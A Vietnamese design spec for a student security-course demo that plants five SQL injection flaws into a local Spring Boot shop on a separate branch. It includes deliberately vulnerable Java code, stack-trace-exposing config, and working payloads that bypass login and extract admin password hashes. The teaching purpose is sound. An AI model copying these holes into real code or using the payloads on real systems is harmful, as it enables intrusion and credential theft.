# Design Spec — Cài lỗ hổng SQL Injection vào HPB-Shop để demo BTL ATBM

> **Môn:** Nhập môn An toàn Bảo mật Hệ thống Thông tin
> **Chủ đề nhóm:** CEH Module 15 — SQL Injection
> **Ngày:** 2026-04-29
> **Project mục tiêu:** `HPB-Shop` (FE) + `HPB-Shop-BE` (Spring Boot 4.0.3 + JPA + MySQL 8.4)

---

## 1. Bối cảnh & Mục tiêu

### 1.1 Bối cảnh
- Dự án `HPB-Shop` hiện đang chạy bình thường ở `http://localhost:5500` (FE) và `http://localhost:8080` (BE) với database `HPBSports_DB`. Backend Spring Boot dùng JPA / Hibernate với prepared statements → mặc định an toàn trước SQL Injection.
- Bài tập lớn của nhóm yêu cầu **demo trực tiếp 5 kỹ thuật SQL Injection** trên một ứng dụng web thực tế, có chủ đích cài lỗ hổng để thuyết trình.
- Báo cáo `bao-cao-sql-injection.md` (878 dòng) đã được viết xong và **không cần cập nhật** trong scope này — báo cáo dùng VulnShop PHP cũ làm tài liệu, còn HPB-Shop đóng vai trò ứng dụng demo trực tiếp khi thuyết trình.

### 1.2 Mục tiêu
- Cài 5 lỗ hổng SQL Injection vào HPB-Shop, mỗi lỗ hổng tương ứng 1 endpoint riêng, mỗi endpoint sinh 1 kịch bản tấn công rõ ràng.
- Mỗi lỗ hổng đều hỗ trợ cả 2 hình thức demo: **gõ payload bằng tay** trên UI/Postman và **chạy sqlmap** tự động.
- Sau buổi demo, để khôi phục bản an toàn: chiếu sang project gốc HPB-Shop (chưa sửa) thay vì revert. Branch `feat/sqli-demo` giữ riêng phiên bản vulnerable.

### 1.3 Phạm vi (in-scope)
- Sửa code Spring Boot để cài lỗ hổng tại 5 endpoint.
- Seed thêm user vào DB để dữ liệu leak ấn tượng hơn.
- Cập nhật `application.properties` để expose error stack trace (cần cho Error-based).
- Viết tài liệu `docs/DEMO-SQLI-PAYLOADS.md` chứa cheat sheet payload + lệnh sqlmap.

### 1.4 Out of scope
- Không cập nhật báo cáo `bao-cao-sql-injection.md`.
- Không sửa frontend HTML/JS (FE gọi đúng endpoint hiện tại).
- Không thiết kế WAF, không viết phần "fix lỗ hổng" — phần fix trong báo cáo dùng VulnShop PHP cũ.
- Không thay đổi `Repository`, `Entity`, hay schema (ngoài seed users).

---

## 2. Quyết định kiến trúc

### 2.1 Mô hình inject lỗ hổng — `JdbcTemplate` raw SQL
JPA/Hibernate dùng prepared statements nên không thể tạo SQLi qua đường JPA. Lựa chọn:
- **Đã chọn:** Inject `JdbcTemplate` (Spring built-in, đã có sẵn qua `spring-boot-starter-data-jpa`) vào tầng Service và build SQL bằng nối chuỗi.
- **Lý do:**
  - Realistic — đây là cách lập trình viên Java mới hay viết khi nghĩ JPA "rườm rà"; giảng viên dễ tin "đây là bug có thể xảy ra trong thực tế".
  - Không phá kiến trúc — `Controller`, `Repository`, `Entity` giữ nguyên signature; chỉ Service đổi cách query.
  - sqlmap hoạt động tốt — vì SQL chạy thật trên MySQL, không có middleware lọc.
- **Loại bỏ:** Native query trong `@Repository` với `@Query(nativeQuery=true)` — không thể nối chuỗi tham số trực tiếp được mà không dùng SpEL trick xấu xí, kém realistic.

### 2.2 Strategy — modify in-place trên branch riêng
- Tạo branch `feat/sqli-demo` trong repo `HPB-Shop-BE`.
- Sửa trực tiếp các Service hiện có. Không tạo endpoint song song `/api/vuln/*`.
- Sau demo, chiếu project gốc (branch `main`) làm bản đã fix.

### 2.3 Frontend không đổi
FE gọi đúng endpoint cũ với đúng tên parameter. Payload SQLi truyền qua chính các form/URL parameter đang dùng (ô tìm kiếm, login form, filter). → Demo cực tự nhiên: "đây là cửa hàng thật, hacker chỉ gõ chuỗi đặc biệt vào form bình thường".

### 2.4 Tương thích JSON với FE — alias cột DB sang camelCase
`jdbcTemplate.queryForList(sql)` trả `List<Map<String, Object>>` với key = tên cột DB (snake_case như `product_id`, `image_url`, `created_at`). Trong khi FE đang nhận JSON từ JPA với key camelCase (`productId`, `imageUrl`, `createdAt`).

Để FE không gãy, **mọi SELECT raw phải alias cột về camelCase**, ví dụ:
```sql
SELECT product_id AS productId, name, brand, price, image_url AS imageUrl, description, created_at AS createdAt
FROM products WHERE name LIKE '%...%'
```
Trong UNION, alias trên SELECT đầu tiên sẽ áp cho toàn bộ UNION (theo chuẩn MySQL) → các cột từ `users` cũng map vào key của products. Tương tự cho các endpoint khác.

---

## 3. Thiết kế chi tiết 5 lỗ hổng

### 3.1 Mapping tổng quan

| # | Loại SQLi | Endpoint | UI Page | Kết quả demo |
|---|-----------|----------|---------|--------------|
| 1 | Auth Bypass | `POST /api/auth/login` | Dang-nhap.html | Login as admin không cần password |
| 2 | UNION-based | `GET /api/products/search?keyword=` | Trang-chu.html | Dump bảng `users` ra trang chủ dưới dạng "sản phẩm" |
| 3 | Error-based | `GET /api/products/{id}` | Chi-tiet-san-pham.html | Lộ DB version, schema, password qua MySQL error message |
| 4 | Boolean Blind | `GET /api/products/filter?brand=` | San-pham-theo-hang.html | Suy đoán password admin char-by-char qua TRUE/FALSE |
| 5 | Time-based Blind | `GET /api/customer/orders/my-orders/{userId}` | Don-mua.html | Dump password qua delay response 3s mỗi ký tự đúng |

### 3.2 Lỗ hổng 1 — Auth Bypass

**File sửa:** `service/UserService.java`

**Code vulnerable:**
```java
@Autowired
private JdbcTemplate jdbcTemplate;

public User login(String identifier, String password) {
    String sql = "SELECT * FROM users WHERE username='" + identifier
               + "' AND password='" + password + "'";
    List<User> users = jdbcTemplate.query(sql, userRowMapper);
    return users.isEmpty() ? null : users.get(0);
}
```

**Payload demo:**
- Form Đăng nhập trên UI — Username: `admin' --` / Password: bất kỳ
- Hoặc: Username: `' OR role='admin' --` / Password: bất kỳ

**Lý do bypass:** Comment `--` cắt phần `AND password='...'`, query chỉ còn `WHERE username='admin'` → trả về row admin → controller sinh JWT.

**Ràng buộc:**
- BCrypt hash trong DB không cản được auth bypass vì password check bị comment hoàn toàn.
- `RowMapper` cần map đầy đủ các cột của `User` entity (userId, username, fullname, email, password, phone, role, status, gender, createdAt).

### 3.3 Lỗ hổng 2 — UNION-based

**File sửa:** `service/ProductService.java`

**Code vulnerable:**
```java
public List<Map<String, Object>> search(String keyword) {
    String sql = "SELECT product_id AS productId, name, brand, price, "
               + "image_url AS imageUrl, description, created_at AS createdAt "
               + "FROM products WHERE name LIKE '%" + keyword + "%'";
    return jdbcTemplate.queryForList(sql);
}
```

**Đổi return type Service** từ `List<Product>` sang `List<Map<String, Object>>` để chứa được dữ liệu UNION không khớp schema. Controller cũng đổi tương ứng (FE đang nhận JSON nên đổi không gãy UI).

**Payload demo (gõ vào ô tìm kiếm):**
```
%' UNION SELECT user_id, username, email, 0, password, role FROM users--
```

**Tác động:** Trang chủ hiển thị "sản phẩm" với:
- name = username
- brand = email
- description = role
- image_url = BCrypt password hash (ảnh không render nhưng response JSON chứa hash)

→ Giảng viên thấy ngay danh sách user + password hash trên giao diện.

### 3.4 Lỗ hổng 3 — Error-based

**File sửa:** `controller/PublicProductController.java` + `service/ProductService.java`

**Đổi Controller:** `@PathVariable Integer id` → `@PathVariable String id`.

**Code vulnerable trong Service:**
```java
public List<Map<String, Object>> findByIdRaw(String id) {
    String sql = "SELECT product_id AS productId, name, brand, price, "
               + "image_url AS imageUrl, description, created_at AS createdAt "
               + "FROM products WHERE product_id=" + id;
    try {
        return jdbcTemplate.queryForList(sql);
    } catch (DataAccessException e) {
        throw new RuntimeException(e.getMostSpecificCause().getMessage());
    }
}
```

**Cập nhật `application.properties`:**
```properties
server.error.include-message=always
server.error.include-stacktrace=always
server.error.include-binding-errors=always
spring.mvc.problemdetails.enabled=false
```

**Payload demo (URL — phải URL-encode):**
```
/api/products/1 AND extractvalue(1, concat(0x7e, (SELECT version())))
```

**Tác động:** MySQL ném `XPATH syntax error: '~8.4.7'` → Spring trả response 500 chứa nguyên message → version DB lộ. Lặp lại với `database()`, `(SELECT password FROM users WHERE username='admin')` để leak DB name & password hash.

### 3.5 Lỗ hổng 4 — Boolean Blind

**File sửa:** `service/ProductService.java`

**Code vulnerable:**
```java
public List<Map<String, Object>> filter(String brand, BigDecimal minPrice, BigDecimal maxPrice) {
    String sql = "SELECT product_id AS productId, name, brand, price, "
               + "image_url AS imageUrl, description, created_at AS createdAt "
               + "FROM products WHERE brand='" + brand + "'";
    if (minPrice != null) sql += " AND price >= " + minPrice;
    if (maxPrice != null) sql += " AND price <= " + maxPrice;
    return jdbcTemplate.queryForList(sql);
}
```

**Payload demo (URL parameter `brand=`):**
```
Yonex' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='$'--
```

**Tác động:** Nếu ký tự đầu của BCrypt hash của admin = `$` → trả về danh sách Yonex products (TRUE). Ký tự khác → trả về rỗng (FALSE). Attacker iterate vị trí 1..60 với ký tự a-z, 0-9, các symbol → reconstruct toàn bộ hash. sqlmap tự làm bước này.

### 3.6 Lỗ hổng 5 — Time-based Blind

**File sửa:** `controller/customer/CustomerOrderController.java` + `service/OrderService.java`

**Đổi Controller:** `@PathVariable Integer userId` → `@PathVariable String userId`.

**Code vulnerable trong Service:**
```java
public List<Map<String, Object>> getMyOrdersRaw(String userId) {
    String sql = "SELECT order_id AS orderId, user_id AS userId, total_price AS totalPrice, "
               + "status, shipping_address AS shippingAddress, created_at AS createdAt "
               + "FROM orders WHERE user_id=" + userId;
    return jdbcTemplate.queryForList(sql);
}
```
*Note: cột thực tế của bảng `orders` sẽ được verify khi implement; alias đảm bảo FE đọc đúng key camelCase.*

**Payload demo (URL-encoded path variable):**
```
/api/customer/orders/my-orders/2 AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='$', SLEEP(3), 0)
```

**Tác động:** Nếu ký tự đúng → response delay 3 giây. Sai → trả ngay. sqlmap đo timing để dump password.

**Note:** Endpoint này yêu cầu JWT. Attacker phải login với `customer1`/`123456` (hoặc bất kỳ tài khoản customer free nào) để có token, rồi dùng token đó tấn công. Trong demo sẽ giải thích: "kẻ tấn công có 1 tài khoản miễn phí, dùng nó để leak admin".

---

## 4. Seed data bổ sung

Hiện DB có 2 user (`admin`, `customer1`). Thêm 4 user nữa qua API `/api/auth/register` rồi UPDATE role/status:

| username | password | role | status | mục đích |
|----------|----------|------|--------|----------|
| `manager` | `manager123` | admin | active | Có 2 admin để UNION dump nhìn phong phú |
| `staff01` | `staff123` | customer | active | Tăng số lượng row trong UNION |
| `vipuser` | `vippass` | customer | active | Tăng số lượng row trong UNION |
| `locked01` | `abc123` | customer | locked | Demo: ngay cả tài khoản bị khóa cũng leak được password |

Thực hiện qua API + SQL UPDATE để BCrypt hash đúng. **Không** insert plaintext password trực tiếp.

---

## 5. Cập nhật cấu hình & file mới

### 5.1 `application.properties`
Thêm cuối file:
```properties
# === SQLi Demo Config: expose stack trace cho Error-based ===
server.error.include-message=always
server.error.include-stacktrace=always
server.error.include-binding-errors=always
spring.mvc.problemdetails.enabled=false
```

### 5.2 File mới — `docs/DEMO-SQLI-PAYLOADS.md`
Chứa:
- 5 mục tương ứng 5 lỗ hổng, mỗi mục có:
  - Endpoint + HTTP method
  - Payload bằng tay (raw + URL-encoded)
  - Lệnh `curl` để test nhanh không cần UI
  - Lệnh `sqlmap` tương ứng (auto-detect + dump)
  - Kết quả mong đợi (output mẫu)
- Mục cuối: hướng dẫn cleanup `git checkout main` để khôi phục bản an toàn

### 5.3 SecurityConfig — không đổi
Đã verify: tất cả 5 endpoint vulnerable đều được phép gọi (auth/products là `permitAll()`, customer cần JWT customer thường — đã có sẵn `customer1`).

---

## 6. Workflow Git

Chỉ làm việc trong repo `HPB-Shop-BE` (FE không động đến):
1. Tạo branch `feat/sqli-demo` từ `main` hiện tại.
2. Mỗi lỗ hổng commit riêng:
   - `feat: add Auth Bypass via JdbcTemplate raw SQL in login`
   - `feat: add UNION-based SQLi in product search`
   - `feat: add Error-based SQLi in product detail (expose stack trace)`
   - `feat: add Boolean Blind SQLi in product filter`
   - `feat: add Time-based Blind SQLi in my-orders`
   - `chore: seed extra users + add demo payload cheat sheet`
3. Push branch (nếu muốn lưu trên remote).
4. Trước demo: `git checkout feat/sqli-demo && mvn spring-boot:run`.
5. Sau demo cần show "bản đã fix": chiếu sang folder/repo `HPB-Shop-BE` ở branch `main` (hoặc một clone riêng) để so sánh trực quan.

---

## 7. Kịch bản demo trên buổi thuyết trình

Thứ tự đề xuất (từ ấn tượng cao → thấp dần để giữ attention):

1. **Auth Bypass** (60 giây) — gõ `admin' --` vào form login → vào thẳng Admin Dashboard.
2. **UNION-based** (90 giây) — gõ payload vào ô search trên Trang chủ → trang hiển thị password hash của tất cả user.
3. **Error-based** (60 giây) — sửa URL chi tiết sản phẩm → trang lỗi MySQL leak version + DB name.
4. **Boolean Blind** (90 giây) — chạy `sqlmap --technique=B` → đợi vài giây → password admin hiện ra.
5. **Time-based Blind** (90 giây) — chạy `sqlmap --technique=T` (giải thích "endpoint này không trả lỗi nhưng vẫn dump được nhờ delay") → password hiện ra.

Sau cùng: 60 giây giải thích phòng chống — chiếu project gốc HPB-Shop (`main` branch chưa sửa) cho thấy "code dùng JPA prepared statement thì những payload trên đều thất bại".

Tổng demo: ~7-8 phút.

---

## 8. Rủi ro & cân nhắc

| Rủi ro | Mức độ | Hướng giảm thiểu |
|--------|--------|------------------|
| FE đang nhận JSON theo schema `Product`, đổi return type Service sang `Map<String,Object>` có thể gãy UI | Cao | Mục 2.4 — alias mọi cột DB sang camelCase trong SELECT raw để key JSON khớp với hợp đồng FE; smoke test FE sau mỗi endpoint sửa |
| Spring Boot 4.0.3 mới, một số config error có thể không hoạt động đúng kỳ vọng | Trung bình | Test riêng Error-based trước khi demo, fallback dùng `@RestControllerAdvice` thủ công nếu cần |
| sqlmap có thể bị JWT chặn ở endpoint `/my-orders` | Trung bình | Truyền JWT của `customer1` qua `--header "Authorization: Bearer ..."` |
| Payload có ký tự đặc biệt cần URL-encode đúng | Thấp | Cheat sheet đã chuẩn bị sẵn 2 phiên bản (raw + encoded) |
| Cài đặt accidentally leak ra `main` branch (nếu push nhầm) | Thấp | Làm trên branch riêng, không merge vào `main` |

---

## 9. Tiêu chí "xong" (Definition of Done)

1. ✅ 5 lỗ hổng đều demo được bằng tay trên UI/Postman, kết quả khớp mô tả ở mục 3.
2. ✅ 5 lỗ hổng đều bị `sqlmap --batch` detect và khai thác thành công.
3. ✅ FE vẫn dùng được bình thường khi không có payload (search trả sản phẩm thật, login với admin/admin123 vẫn vào, v.v.).
4. ✅ File `docs/DEMO-SQLI-PAYLOADS.md` có sẵn để dùng trong demo.
5. ✅ Branch `feat/sqli-demo` clean, có 6 commit như mục 6.
6. ✅ Backend chạy không crash khi nhận payload bất thường (catch và trả lỗi đẹp, không sập app).
